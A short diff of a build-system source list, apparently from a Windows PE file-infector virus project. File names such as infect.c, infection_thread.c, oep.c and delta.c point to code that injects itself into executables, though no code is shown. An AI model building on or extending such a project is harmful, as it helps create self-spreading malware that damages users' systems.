@@ -1,15 +1,14 @@
 add_sources(
-    main.c
     code_begin.c
     infection_thread.c
     infect.c
     utility.c
-    data.c
     pe.c
     oep.c
-    function_list.c
+    function_kernel32.c
     string_generator.c
     checksum.c
     process_info.c
+    delta.c
     disasm.c
     code_end.c)
